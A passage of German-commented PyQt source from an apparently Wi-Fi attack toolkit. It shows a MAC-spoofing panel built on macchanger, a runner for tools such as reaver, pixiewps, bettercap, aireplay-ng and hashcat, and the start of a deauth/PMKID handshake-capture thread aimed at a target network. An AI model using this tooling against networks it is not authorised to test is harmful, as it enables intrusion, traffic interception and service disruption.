                rc, out, _ = CommandRunner.run(
                    ["iw", "dev", self.iface_name, "info"],
                    subsystem="driver",
                    tag="watchdog",
                    soft_fail=True,
                    timeout=3,
                )
                for line in out.splitlines():
                    if line.strip().startswith("type "):
                        mode = line.split(None, 1)[1].strip()
                        break
                info["mode"] = mode
                self._last_mode = mode

                # TX
                rc, out, _ = CommandRunner.run(
                    ["iw", "dev", self.iface_name, "get", "txpower"],
                    subsystem="driver",
                    tag="watchdog",
                    soft_fail=True,
                    timeout=3,
                )
                m = re.search(r"([\d.]+)\s*dBm", out)
                if m:
                    info["tx_dbm"] = int(float(m.group(1)))

                # Kanal
                rc, out, _ = CommandRunner.run(
                    ["iw", "dev", self.iface_name, "info"],
                    subsystem="driver",
                    tag="watchdog",
                    soft_fail=True,
                    timeout=3,
                )
                m = re.search(r"channel\s+(\d+)", out)
                if m:
                    info["channel"] = int(m.group(1))
            except (OSError, subprocess.SubprocessError, re.error):
                pass

        try:
            self.status_update.emit(self.iface_name, info)
        except (RuntimeError, TypeError):
            pass


# ══════════════════════════════════════════════════════════════════════
# v37-R22: FakeMAC — MAC-Adress-Aenderung
# ══════════════════════════════════════════════════════════════════════
_MAC_BACKUP_FILE = AppKonstanten.KONFIG_DIR / "mac_backup.json"


def _load_mac_backup() -> dict[str, str]:
    """Laedt Original-MACs aus Backup-Datei."""
    try:
        if _MAC_BACKUP_FILE.exists():
            data = json.loads(_MAC_BACKUP_FILE.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                return {k: v for k, v in data.items() if isinstance(v, str)}
    except (OSError, json.JSONDecodeError, ValueError) as exc:
        logging.getLogger("wlan_ultimate.FakeMAC").warning("MAC-Backup laden: %s", exc)
    return {}


def _save_mac_backup(data: dict[str, str]) -> bool:
    """Speichert Original-MACs."""
    try:
        _MAC_BACKUP_FILE.parent.mkdir(parents=True, exist_ok=True)
        _MAC_BACKUP_FILE.write_text(
            json.dumps(data, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        return True
    except (OSError, TypeError, ValueError) as exc:
        logging.getLogger("wlan_ultimate.FakeMAC").warning(
            "MAC-Backup speichern: %s", exc
        )
        return False


def _read_iface_mac(iface: str) -> str | None:
    """Liest die aktuelle MAC-Adresse eines Interface.

    Returns:
        Format "aa:bb:cc:dd:ee:ff" (lowercase) oder None.
    """
    try:
        proc = subprocess.run(
            ["ip", "link", "show", iface],
            capture_output=True,
            text=True,
            timeout=3,
            check=False,
        )
        m = re.search(
            r"link/ether\s+([0-9a-fA-F:]{17})",
            proc.stdout or "",
        )
        if m:
            return m.group(1).lower()
    except (
        FileNotFoundError,
        subprocess.TimeoutExpired,
        subprocess.SubprocessError,
        OSError,
    ):
        pass
    return None


def _validate_mac(mac: str) -> bool:
    """Validiert eine MAC-Adresse (Format + erster Oktett-Bereich)."""
    if not mac or not isinstance(mac, str):
        return False
    if not re.match(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$", mac):
        return False
    # Multicast-Bit (LSB of first octet) muss 0 sein
    try:
        first = int(mac.split(":")[0], 16)
        if first & 0x01:
            return False
    except (ValueError, IndexError):
        return False
    return True


class MACChangeThread(QThread):
    """Fuehrt eine MAC-Aenderung sequenziell aus.

    Ablauf:
      1. Root-Check
      2. Interface down
      3. macchanger mit Modus ausfuehren
      4. Interface up
      5. Neue MAC auslesen

    Signals:
        line(str, str): (Text, level: INFO/WARN/ERR/OK)
        done(bool, str): (success, new_mac_or_error)
    """

    line = pyqtSignal(str, str)
    done = pyqtSignal(bool, str)

    def __init__(
        self,
        iface: str,
        mode: str,
        custom_mac: str | None = None,
        original_mac: str | None = None,
        parent: QObject | None = None,
    ) -> None:
        """Initialisiert den Thread.

        Args:
            iface: Interface-Name
            mode: "random" | "vendor" | "custom" | "restore"
            custom_mac: Nur bei mode="custom"
            original_mac: Nur bei mode="restore" (Original-MAC)
        """
        super().__init__(parent)
        self.iface = iface
        self.mode = mode
        self.custom_mac = custom_mac
        self.original_mac = original_mac
        self._logger = logging.getLogger("wlan_ultimate.MACChangeThread")

    def _emit(self, msg: str, level: str = "INFO") -> None:
        self.line.emit(str(msg)[:300], level)
        self._logger.info(msg)

    def _run_cmd(
        self,
        cmd: list[str],
        timeout: float = 8.0,
    ) -> tuple[int, str, str]:
        """Fuehrt ein Kommando aus (kurz, synchron)."""
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            return proc.returncode, proc.stdout or "", proc.stderr or ""
        except FileNotFoundError:
            return -1, "", f"{cmd[0]} nicht gefunden"
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout"
        except (subprocess.SubprocessError, OSError) as exc:
            return -1, "", str(exc)

    def run(self) -> None:
        try:
            # 1. Root-Check
            try:
                if os.geteuid() != 0:
                    self.done.emit(False, "Root-Rechte erforderlich (sudo)")
                    return
            except AttributeError:
                self.done.emit(False, "geteuid nicht verfuegbar")
                return

            # 2. macchanger verfuegbar?
            if shutil.which("macchanger") is None:
                self.done.emit(
                    False, "macchanger nicht installiert (apt install macchanger)"
                )
                return

            # 3. Aktuelle MAC als Backup (falls noch nicht gespeichert)
            current_before = _read_iface_mac(self.iface)
            if current_before:
                backup = _load_mac_backup()
                if self.iface not in backup:
                    backup[self.iface] = current_before
                    _save_mac_backup(backup)
                    self._emit(
                        f"Original-MAC gespeichert: {current_before}",
                        "OK",
                    )
                else:
                    self._emit(
                        f"Original-MAC bereits bekannt: " f"{backup[self.iface]}",
                    )

            # 4. Interface down
            self._emit(f"Setze {self.iface} auf down ...")
            rc, _, err = self._run_cmd(["ip", "link", "set", self.iface, "down"])
            if rc != 0:
                self.done.emit(False, f"ip link down: {err[:100]}")
                return

            # 5. macchanger-Befehl zusammenbauen
            if self.mode == "random":
                flag = ["-r"]
                desc = "Zufaellige MAC"
            elif self.mode == "vendor":
                flag = ["-A"]
                desc = "Hersteller-MAC (bekannte Vendor)"
            elif self.mode == "custom":
                if not self.custom_mac or not _validate_mac(self.custom_mac):
                    self._run_cmd(["ip", "link", "set", self.iface, "up"])
                    self.done.emit(False, f"Ungueltige MAC: {self.custom_mac}")
                    return
                flag = ["-m", self.custom_mac]
                desc = f"Custom: {self.custom_mac}"
            elif self.mode == "restore":
                if not self.original_mac or not _validate_mac(self.original_mac):
                    self._run_cmd(["ip", "link", "set", self.iface, "up"])
                    self.done.emit(False, "Keine Original-MAC zum Wiederherstellen")
                    return
                flag = ["-m", self.original_mac]
                desc = f"Restore: {self.original_mac}"
            else:
                self._run_cmd(["ip", "link", "set", self.iface, "up"])
                self.done.emit(False, f"Unbekannter Modus: {self.mode}")
                return

            self._emit(f"Setze MAC: {desc}")
            rc, out, err = self._run_cmd(["macchanger", *flag, self.iface])
            for ln in (out or "").splitlines():
                if ln.strip():
                    self._emit(ln.strip())

            # 6. Interface up
            self._emit(f"Setze {self.iface} auf up ...")
            self._run_cmd(["ip", "link", "set", self.iface, "up"])
            time.sleep(0.3)

            # 7. Neue MAC auslesen
            new_mac = _read_iface_mac(self.iface)
            if rc != 0:
                self.done.emit(False, f"macchanger rc={rc}: {err[:100]}")
                return

            if new_mac:
                self._emit(f"Neue MAC: {new_mac}", "OK")
                self.done.emit(True, new_mac)
            else:
                self.done.emit(False, "MAC nicht lesbar nach Aenderung")
        except Exception as exc:
            self._logger.exception("MACChangeThread")
            self.done.emit(False, f"Interner Fehler: {exc}")


class FakeMACPanel(QWidget):
    """Widget zur MAC-Adress-Verwaltung.

    Features:
    - Aktuelle MAC live anzeigen
    - Original-MAC aus Backup
    - Zufalls-MAC (macchanger -r)
    - Hersteller-MAC (macchanger -A)
    - Custom-MAC (validiert)
    - Restore (Original-MAC)
    - Live-Log
    """

    def __init__(
        self,
        iface_getter: Callable[[], str | None] | None = None,
        parent: QWidget | None = None,
    ) -> None:
        super().__init__(parent)
        self._iface_getter = iface_getter
        self._thread: MACChangeThread | None = None
        self._original_mac: str | None = None
        self._logger = logging.getLogger("wlan_ultimate.FakeMACPanel")
        self._build_ui()
        QTimer.singleShot(200, self.refresh)

    def _iface(self) -> str | None:
        if self._iface_getter is not None:
            try:
                return self._iface_getter()
            except Exception:
                return None
        return None

    def _build_ui(self) -> None:
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        layout.setContentsMargins(10, 10, 10, 10)

        # ── Header ────────────────────────────────────────────────
        header = QLabel("🎭 MAC-Adresse aendern (Fake-MAC)")
        header.setStyleSheet(
            "font-size:15px;font-weight:bold;color:#2a82da;"
            "padding:4px;border-bottom:1px solid #444;"
        )
        layout.addWidget(header)

        # ── Status-Gruppe ─────────────────────────────────────────
        g_status = QGroupBox("📡 Adapter-Status")
        status_lay = QGridLayout(g_status)

        status_lay.addWidget(QLabel("Interface:"), 0, 0)
        self._mac_iface_label = QLabel("—")
        self._mac_iface_label.setStyleSheet("font-family:monospace;color:#2a82da;")
        status_lay.addWidget(self._mac_iface_label, 0, 1)

        status_lay.addWidget(QLabel("Aktuelle MAC:"), 0, 2)
        self._mac_current_label = QLabel("—")
        self._mac_current_label.setStyleSheet(
            "font-family:monospace;color:#27ae60;font-weight:bold;"
        )
        status_lay.addWidget(self._mac_current_label, 0, 3)

        status_lay.addWidget(QLabel("Original-MAC:"), 1, 0)
        self._mac_original_label = QLabel("—")
        self._mac_original_label.setStyleSheet("font-family:monospace;color:#f39c12;")
        status_lay.addWidget(self._mac_original_label, 1, 1)

        self._mac_refresh_btn = QPushButton("🔄 Aktualisieren")
        self._mac_refresh_btn.clicked.connect(self.refresh)
        status_lay.addWidget(self._mac_refresh_btn, 1, 3)
        layout.addWidget(g_status)

        # ── Änderungs-Gruppe ──────────────────────────────────────
        g_change = QGroupBox("🎭 MAC aendern")
        change_lay = QVBoxLayout(g_change)

        # Random + Vendor
        row1 = QHBoxLayout()
        self._mac_btn_random = QPushButton("🎲 Zufalls-MAC")
        self._mac_btn_random.setStyleSheet(
            "background:#3498db;color:white;font-weight:bold;padding:8px;"
        )
        self._mac_btn_random.clicked.connect(lambda: self._apply("random"))
        row1.addWidget(self._mac_btn_random)

        self._mac_btn_vendor = QPushButton("🏢 Hersteller-MAC")
        self._mac_btn_vendor.setStyleSheet(
            "background:#9b59b6;color:white;font-weight:bold;padding:8px;"
        )
        self._mac_btn_vendor.clicked.connect(lambda: self._apply("vendor"))
        row1.addWidget(self._mac_btn_vendor)
        change_lay.addLayout(row1)

        # Custom-MAC
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Custom MAC:"))
        self._mac_custom_edit = QLineEdit()
        self._mac_custom_edit.setPlaceholderText("aa:bb:cc:dd:ee:ff")
        self._mac_custom_edit.setMaxLength(17)
        self._mac_custom_edit.setStyleSheet("font-family:monospace;")
        row2.addWidget(self._mac_custom_edit, 1)

        self._mac_btn_custom = QPushButton("✅ Setzen")
        self._mac_btn_custom.setStyleSheet(
            "background:#27ae60;color:white;font-weight:bold;padding:6px;"
        )
        self._mac_btn_custom.clicked.connect(lambda: self._apply("custom"))
        row2.addWidget(self._mac_btn_custom)
        change_lay.addLayout(row2)

        # Restore
        row3 = QHBoxLayout()
        self._mac_btn_restore = QPushButton("↩ Original wiederherstellen")
        self._mac_btn_restore.setStyleSheet(
            "background:#e67e22;color:white;font-weight:bold;padding:8px;"
        )
        self._mac_btn_restore.clicked.connect(lambda: self._apply("restore"))
        row3.addWidget(self._mac_btn_restore)

        self._mac_btn_vendor_restore = QPushButton("↩ macchanger -p (Permanent)")
        self._mac_btn_vendor_restore.clicked.connect(self._restore_permanent)
        row3.addWidget(self._mac_btn_vendor_restore)
        row3.addStretch()
        change_lay.addLayout(row3)

        layout.addWidget(g_change)

        # ── Info ──────────────────────────────────────────────────
        self._mac_info = QLabel(
            "ℹ macchanger benoetigt Root-Rechte. "
            "Original-MAC wird beim ersten Aendern gespeichert und "
            "kann jederzeit wiederhergestellt werden."
        )
        self._mac_info.setStyleSheet("color:#bdc3c7;font-size:9pt;padding:4px;")
        self._mac_info.setWordWrap(True)
        layout.addWidget(self._mac_info)

        # ── Live-Log ──────────────────────────────────────────────
        self._mac_log = QPlainTextEdit()
        self._mac_log.setReadOnly(True)
        self._mac_log.setMinimumHeight(120)
        self._mac_log.setStyleSheet(
            "background:#1a1a1a;color:#ddd;" "font-family:monospace;font-size:10px;"
        )
        self._mac_log.setPlaceholderText("Live-Log erscheint hier bei MAC-Aenderung …")
        layout.addWidget(self._mac_log)
        layout.addStretch()

    # ══════════════════════════════════════════════════════════════════
    # Handlers
    # ══════════════════════════════════════════════════════════════════
    def _log(self, msg: str, level: str = "INFO") -> None:
        colors = {
            "OK": "#27ae60",
            "WARN": "#f39c12",
            "ERR": "#e74c3c",
            "INFO": "#bdc3c7",
        }
        color = colors.get(level, "#bdc3c7")
        t = datetime.now().strftime("%H:%M:%S")
        html = (
            f"<span style='color:#7f8c8d;'>[{t}]</span> "
            f"<span style='color:{color};'>{msg}</span>"
        )
        try:
            self._mac_log.appendHtml(html)
            sb = self._mac_log.verticalScrollBar()
            sb.setValue(sb.maximum())
        except (RuntimeError, AttributeError):
            pass

    def refresh(self) -> None:
        """Liest aktuelle Werte neu ein."""
        iface = self._iface()
        if not iface:
            self._mac_iface_label.setText("— (kein Adapter)")
            self._mac_current_label.setText("—")
            self._mac_original_label.setText("—")
            return

        self._mac_iface_label.setText(iface)

        current = _read_iface_mac(iface)
        self._mac_current_label.setText(current or "—")

        backup = _load_mac_backup()
        self._original_mac = backup.get(iface)
        self._mac_original_label.setText(
            self._original_mac or "(noch nicht gespeichert)"
        )

    def _apply(self, mode: str) -> None:
        """Startet eine MAC-Aenderung."""
        if self._thread is not None and self._thread.isRunning():
            QMessageBox.warning(self, "MAC", "Eine Aenderung laeuft bereits.")
            return

        iface = self._iface()
        if not iface:
            QMessageBox.warning(self, "Kein Adapter", "Kein WLAN-Interface aktiv.")
            return

        # Bestaetigung fuer alle Aenderungen ausser Restore
        if mode != "restore":
            reply = QMessageBox.question(
                self,
                "MAC aendern",
                f"MAC von {iface} aendern?\n\n"
                f"Modus: {mode}\n\n"
                "⚠ Interface wird kurz down/up geschaltet.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No,
            )
            if reply != QMessageBox.StandardButton.Yes:
                return

        custom = None
        if mode == "custom":
            custom = self._mac_custom_edit.text().strip().lower()
            if not _validate_mac(custom):
                QMessageBox.warning(
                    self,
                    "Ungueltige MAC",
                    "Format: aa:bb:cc:dd:ee:ff (6 Octets)\n"
                    "Erstes Octet muss gerade sein (kein Multicast-Bit).",
                )
                return

        orig = None
        if mode == "restore":
            orig = self._original_mac
            if not orig:
                QMessageBox.warning(
                    self,
                    "Keine Original-MAC",
                    "Keine Original-MAC gespeichert.\n"
                    "Nutze 'macchanger -p' als Fallback.",
                )
                return

        self._mac_log.clear()
        self._set_buttons_enabled(False)

        self._thread = MACChangeThread(
            iface=iface,
            mode=mode,
            custom_mac=custom,
            original_mac=orig,
        )
        self._thread.line.connect(self._log)
        self._thread.done.connect(self._on_done)
        self._thread.start()

    def _restore_permanent(self) -> None:
        """Ruft macchanger -p auf (Permanent Original aus Hardware)."""
        iface = self._iface()
        if not iface:
            return
        reply = QMessageBox.question(
            self,
            "MAC -p",
            f"macchanger -p auf {iface} ausfuehren?\n\n"
            "Setzt die hardware-permanente MAC (nicht die "
            "gespeicherte Original-MAC).",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return
        self._apply("permanent")

    def _on_done(self, success: bool, result: str) -> None:
        self._set_buttons_enabled(True)
        if success:
            self._log(f"MAC geaendert: {result}", "OK")
            self.refresh()
        else:
            self._log(f"Fehler: {result}", "ERR")

    def _set_buttons_enabled(self, enabled: bool) -> None:
        for btn in (
            self._mac_btn_random,
            self._mac_btn_vendor,
            self._mac_btn_custom,
            self._mac_btn_restore,
            self._mac_btn_vendor_restore,
            self._mac_refresh_btn,
        ):
            try:
                btn.setEnabled(enabled)
            except RuntimeError:
                pass

    def cleanup(self) -> None:
        """Wird bei App-Ende aufgerufen: stoppt laufenden Thread."""
        if self._thread is not None and self._thread.isRunning():
            self._thread.requestInterruption()
            self._thread.wait(2000)


# ══════════════════════════════════════════════════════════════════════
# v37-R21: ToolRunner — zentrale externe-Tool-Infrastruktur
# ══════════════════════════════════════════════════════════════════════
@dataclass
class ToolRunResult:
    """Ergebnis eines externen Tool-Aufrufs.

    Attributes:
        tool:          Tool-Name (z. B. "wash")
        args:          Kommandozeilen-Argumente
        returncode:    Exit-Code (None = laeuft noch)
        stdout:        Zusammengefasster stdout
        stderr:        Zusammengefasster stderr
        duration_s:    Laufzeit in Sekunden
        aborted:       True wenn abgebrochen
        timed_out:     True wenn Timeout
        started_at:    Startzeit
        error:         Fehlermeldung bei Exception
    """

    tool: str
    args: list[str] = field(default_factory=list)
    returncode: int | None = None
    stdout: str = ""
    stderr: str = ""
    duration_s: float = 0.0
    aborted: bool = False
    timed_out: bool = False
    started_at: datetime = field(default_factory=datetime.now)
    error: str = ""

    def success(self) -> bool:
        return self.returncode == 0 and not self.aborted and not self.timed_out

    def to_dict(self) -> dict[str, Any]:
        return {
            "tool": self.tool,
            "args": list(self.args),
            "returncode": self.returncode,
            "stdout": self.stdout[:5000],
            "stderr": self.stderr[:2000],
            "duration_s": round(self.duration_s, 2),
            "aborted": self.aborted,
            "timed_out": self.timed_out,
            "started_at": self.started_at.isoformat(),
            "error": self.error,
            "success": self.success(),
        }


class ToolRunner(QThread):
    """Asynchroner Runner fuer externe CLI-Tools.

    Features:
    - QThread-basiert (kein GUI-Freeze)
    - Live-Output via ``line``-Signal
    - Fortschritts-Parsing (``NN%`` oder ``[NN%]``)
    - Timeout + Abbruch (SIGTERM -> SIGKILL)
    - Automatischer Shell-Wrapper optional (``shell=True``)
    - Ergebnis als ``ToolRunResult``

    Signals:
        line(str, str): (Text, level: INFO/WARN/ERR)
        progress(int):  0-100 (nur wenn Tool Fortschritt liefert)
        done(object):   ToolRunResult
    """

    line = pyqtSignal(str, str)
    progress = pyqtSignal(int)
    done = pyqtSignal(object)

    # Bekannte Tools mit Pfad + Modul (fuer modinfo-Check)
    KNOWN_TOOLS: dict[str, dict[str, str]] = {
        "wash": {"desc": "WPS-Scan", "pkg": "reaver"},
        "reaver": {"desc": "WPS-PIN-Bruteforce", "pkg": "reaver"},
        "bully": {"desc": "WPS-Bruteforce", "pkg": "bully"},
        "pixiewps": {"desc": "Pixie-Dust-Angriff", "pkg": "pixiewps"},
        "macchanger": {"desc": "MAC-Adresse aendern", "pkg": "macchanger"},
        "kismet": {"desc": "WLAN-Scanner (passiv)", "pkg": "kismet"},
        "bettercap": {"desc": "MITM-Framework", "pkg": "bettercap"},
        "hcxdumptool": {"desc": "PMKID-Capture", "pkg": "hcxtools"},
        "hashcat": {"desc": "Cracker (GPU)", "pkg": "hashcat"},
        "aircrack-ng": {"desc": "WPA-Cracker", "pkg": "aircrack-ng"},
        "aireplay-ng": {"desc": "Deauth/Injection", "pkg": "aircrack-ng"},
        "airodump-ng": {"desc": "Capture-Tool", "pkg": "aircrack-ng"},
        "tshark": {"desc": "Paket-Analyse", "pkg": "wireshark"},
        "nmap": {"desc": "Port-Scanner", "pkg": "nmap"},
        "iw": {"desc": "Wireless-Konfig", "pkg": "iw"},
    }

    def __init__(
        self,
        tool: str,
        args: list[str] | None = None,
        timeout: float = 300.0,
        shell: bool = False,
        parse_progress: bool = True,
        cwd: str | Path | None = None,
        env: dict[str, str] | None = None,
        parent: QObject | None = None,
    ) -> None:
        """Initialisiert den Runner.

        Args:
            tool: Tool-Name oder absoluter Pfad
            args: Argument-Liste
            timeout: Maximale Laufzeit in Sekunden
            shell: True -> Tool-Aufruf via Shell
            parse_progress: Fortschritt aus Output parsen
            cwd: Arbeitsverzeichnis
            env: Zusaetzliche Umgebungsvariablen
            parent: Eltern-Objekt
        """
        super().__init__(parent)
        self.tool = tool
        self.args = list(args or [])
        self.timeout = timeout
        self.use_shell = shell
        self.parse_progress = parse_progress
        self.cwd = Path(cwd) if cwd else None
        self.extra_env = dict(env or {})

        self._logger = logging.getLogger(f"wlan_ultimate.ToolRunner.{tool}")
        self._proc: subprocess.Popen | None = None
        self._abort_event = threading.Event()
        self._stdout_buf: list[str] = []
        self._stderr_buf: list[str] = []
        self._result = ToolRunResult(tool=tool, args=list(self.args))
        self._last_pct = 0

    def abort(self) -> None:
        """Bricht den laufenden Prozess ab (SIGTERM)."""
        self._abort_event.set()
        proc = self._proc
        if proc is None:
            return
        if proc.poll() is not None:
            return
        try:
            proc.terminate()
        except (OSError, RuntimeError) as exc:
            self._logger.debug("terminate: %s", exc)

    def _kill_if_needed(self) -> None:
        """Nach Abort: hart killen wenn nach 3s noch laeuft."""
        proc = self._proc
        if proc is None:
            return
        try:
            if proc.poll() is None:
                proc.kill()
        except (OSError, RuntimeError) as exc:
            self._logger.debug("kill: %s", exc)

    def _resolve_command(self) -> str | list[str]:
        """Ermittelt den auszufuehrenden Befehl."""
        exe = shutil.which(self.tool) or self.tool
        if self.use_shell:
            parts = [exe, *self.args]
            return " ".join(parts)
        return [exe, *self.args]

    def _emit_line(self, text: str, level: str = "INFO") -> None:
        """Sendet eine Zeile an die GUI + sammelt sie."""
        if not text:
            return
        clean = text.rstrip("\r\n")
        if not clean:
            return
        self.line.emit(clean[:500], level)
        if level == "ERR":
            self._stderr_buf.append(clean)
        else:
            self._stdout_buf.append(clean)

    def _parse_progress_from(self, text: str) -> None:
        """Sucht ``NN%`` oder ``[NN%]`` im Text und emittiert Fortschritt."""
        if not self.parse_progress:
            return
        try:
            # Patterns: "45%", "[ 45%]", "45.3%"
            m = re.search(r"\[(\s*)(\d{1,3})(?:\.\d+)?\s*%\]", text)
            if not m:
                m = re.search(r"(\d{1,3})(?:\.\d+)?\s*%", text)
            if m:
                pct = int(
                    m.group(2) if m.lastindex and m.lastindex >= 2 else m.group(1)
                )
                pct = max(0, min(100, pct))
                if pct > self._last_pct:
                    self._last_pct = pct
                    self.progress.emit(pct)
        except (ValueError, IndexError, AttributeError):
            pass

    def run(self) -> None:
        """Hauptthread: fuehrt das Tool aus."""
        start = time.time()
        self._result.started_at = datetime.now()

        try:
            cmd = self._resolve_command()
            self._logger.info(
                "ToolRunner startet: %s",
                cmd if isinstance(cmd, str) else " ".join(cmd),
            )

            # Env zusammenbauen
            env = os.environ.copy()
            if self.extra_env:
                env.update(self.extra_env)

            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True,
                bufsize=1,
                shell=self.use_shell,
                cwd=str(self.cwd) if self.cwd else None,
                env=env,
            )

            # Stdout + Stderr parallel lesen
            def _read_stream(stream, prefix: str) -> None:
                try:
                    for line in iter(stream.readline, ""):
                        if not line:
                            break
                        level = "ERR" if prefix == "ERR" else "INFO"
                        self._emit_line(line, level)
                        self._parse_progress_from(line)
                except (OSError, ValueError) as exc:
                    self._logger.debug("read_stream: %s", exc)
                finally:
                    try:
                        stream.close()
                    except OSError:
                        pass

            t_out = threading.Thread(
                target=_thread_wrap(_read_stream, "anon-56434"),
                args=(self._proc.stdout, "OUT"),
                daemon=True,
            )
            t_err = threading.Thread(
                target=_thread_wrap(_read_stream, "anon-56439"),
                args=(self._proc.stderr, "ERR"),
                daemon=True,
            )
            t_out.start()
            t_err.start()

            # Warten mit Timeout
            start_wait = time.time()
            while True:
                if self._abort_event.is_set():
                    self._result.aborted = True
                    self._emit_line("ABBRUCH angefordert", "WARN")
                    self.abort()
                    self._kill_if_needed()
                    break
                try:
                    rc = self._proc.poll()
                except (OSError, ValueError):
                    rc = -1
                if rc is not None:
                    self._result.returncode = rc
                    break
                if time.time() - start_wait > self.timeout:
                    self._result.timed_out = True
                    self._emit_line(f"TIMEOUT nach {self.timeout:.0f}s", "ERR")
                    self.abort()
                    self._kill_if_needed()
                    break
                time.sleep(0.1)

            # Streams joinen (max 2 s)
            t_out.join(timeout=2.0)
            t_err.join(timeout=2.0)

            # Finaler Returncode
            if self._result.returncode is None:
                try:
                    self._result.returncode = self._proc.wait(timeout=1)
                except (subprocess.TimeoutExpired, OSError):
                    self._result.returncode = -1

        except FileNotFoundError:
            self._result.error = f"Tool nicht gefunden: {self.tool}"
            self._emit_line(self._result.error, "ERR")
        except (OSError, PermissionError) as exc:
            self._result.error = f"Ausfuehrungsfehler: {exc}"
            self._emit_line(self._result.error, "ERR")
        except Exception as exc:
            self._logger.exception("ToolRunner unerwarteter Fehler")
            self._result.error = f"Interner Fehler: {exc}"
            self._emit_line(self._result.error, "ERR")
        finally:
            self._result.duration_s = time.time() - start
            self._result.stdout = "\n".join(self._stdout_buf)
            self._result.stderr = "\n".join(self._stderr_buf)
            self._proc = None

            if self._result.success():
                self._emit_line(
                    f"Fertig in {self._result.duration_s:.1f}s " f"(rc=0)",
                    "OK",
                )
                self.progress.emit(100)
            elif self._result.aborted:
                self._emit_line("Abgebrochen", "WARN")
            elif self._result.timed_out:
                self._emit_line("Timeout erreicht", "ERR")
            else:
                self._emit_line(
                    f"Fehlgeschlagen (rc={self._result.returncode})",
                    "ERR",
                )

            self.done.emit(self._result)

    # ══════════════════════════════════════════════════════════════════
    # Static Helpers
    # ══════════════════════════════════════════════════════════════════
    @staticmethod
    def is_available(tool: str) -> bool:
        """Prueft ob ein Tool im PATH verfuegbar ist."""
        return shutil.which(tool) is not None

    @staticmethod
    def get_version(tool: str, timeout: float = 3.0) -> str | None:
        """Liest die Versions-Info aus ``tool --version``."""
        if not ToolRunner.is_available(tool):
            return None
        try:
            proc = subprocess.run(
                [tool, "--version"],
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
            text = (proc.stdout or proc.stderr or "").strip()
            first = text.splitlines()[0] if text else ""
            return first[:100] if first else None
        except (
            FileNotFoundError,
            subprocess.TimeoutExpired,
            subprocess.SubprocessError,
            OSError,
        ):
            return None

    @classmethod
    def list_available(cls) -> dict[str, dict[str, Any]]:
        """Listet alle KNOWN_TOOLS mit Verfuegbarkeit."""
        result: dict[str, dict[str, Any]] = {}
        for name, info in cls.KNOWN_TOOLS.items():
            path = shutil.which(name)
            result[name] = {
                "desc": info["desc"],
                "pkg": info["pkg"],
                "available": path is not None,
                "path": path or "",
                "version": cls.get_version(name) if path else None,
            }
        return result


class HandshakeCaptureThread(QThread):
    """Asynchroner Handshake-Capture in einem separaten QThread.

    Führt einen der 4 Modi aus:
    - "passiv":      Nur airodump-ng (kein Deauth)
    - "deauth":      airodump-ng + Deauth-Burst
    - "pmkid":       hcxdumptool (clientlos)
    - "deauth+pmkid": beide parallel

    Signals:
        progress(int): 0-100%
        log_line(str, str): (message, level: INFO/WARN/ERR/OK)
        eapol_update(int, int): (erhalten, gesamt=4)
        signal_update(int): aktuelle Signalstaerke in dBm
        finished_ok(str): Pfad zur Capture-Datei
        failed(str): Fehlermeldung
    """

    progress = pyqtSignal(int)
    log_line = pyqtSignal(str, str)
    eapol_update = pyqtSignal(int, int)
    signal_update = pyqtSignal(int)
    finished_ok = pyqtSignal(str)
    failed = pyqtSignal(str)

    def __init__(
        self,
        attack_ctrl: Any,
        iface: str,
        bssid: str,
        channel: int,
        mode: str = "deauth",
        deauth_count: int = 15,
        timeout: int = 90,
        target_client: str | None = None,
        output_dir: Path | None = None,
        channel_hop: bool = False,
        retry_on_fail: bool = True,
        max_retries: int = 3,
        parent: QObject | None = None,
    ) -> None:
        super().__init__(parent)
        self.attack_ctrl = attack_ctrl
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.mode = mode
        self.deauth_count = deauth_count
        self.timeout = timeout
        self.target_client = target_client or None
        self.channel_hop = channel_hop
        self.retry_on_fail = retry_on_fail
        self.max_retries = max(1, max_retries)
        self.output_dir = output_dir or AppKonstanten.CAPTURE_DIR
        self._logger = logging.getLogger("wlan_ultimate.HandshakeCaptureThread")
        self._abort = threading.Event()
        self._capture_file: Path | None = None
        self._eapol_seen: set[int] = set()

    def abort(self) -> None:
        """Bricht den laufenden Capture ab (thread-safe)."""
        self._abort.set()

    def _log(self, msg: str, level: str = "INFO") -> None:
        self.log_line.emit(str(msg)[:300], level)
        if level == "ERR":
            self._logger.error(msg)
        elif level == "WARN":
            self._logger.warning(msg)
        else:
            self._logger.info(msg)

    def _emit_progress(self, pct: int) -> None:
        try:
            self.progress.emit(max(0, min(100, int(pct))))
        except (RuntimeError, ValueError):
            pass

    def run(self) -> None:
        """Haupt-Thread-Funktion."""
        try:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            self._log(f"Starte Capture: {self.bssid} auf Kanal {self.channel}", "OK")
            self._log(f"Modus: {self.mode} | Timeout: {self.timeout}s")
            self._emit_progress(5)

            last_error = "unbekannt"
            for attempt in range(1, self.max_retries + 1):
                if self._abort.is_set():
                    self._log("Abbruch durch Benutzer", "WARN")
                    self.failed.emit("Abgebrochen")
                    return

                self._log(f"Versuch {attempt}/{self.max_retries}")
                try:
                    ok = self._run_single_attempt(attempt)
                except Exception as exc:
                    self._logger.exception("Capture-Attempt fehlgeschlagen")
                    last_error = str(exc)
                    self._log(f"Fehler: {exc}", "ERR")
                    ok = False

                if ok and self._capture_file and self._capture_file.exists():
                    self._emit_progress(100)
                    self._log(
                        f"Handshake erfasst: {self._capture_file.name}",
                        "OK",
                    )
                    self.finished_ok.emit(str(self._capture_file))
                    return

                if not self.retry_on_fail:
                    break
                if attempt < self.max_retries and not self._abort.is_set():
                    self._log(
                        f"Kein Handshake — warte 3s vor Versuch {attempt+1}",
                        "WARN",
                    )
                    for _ in range(30):
                        if self._abort.is_set():
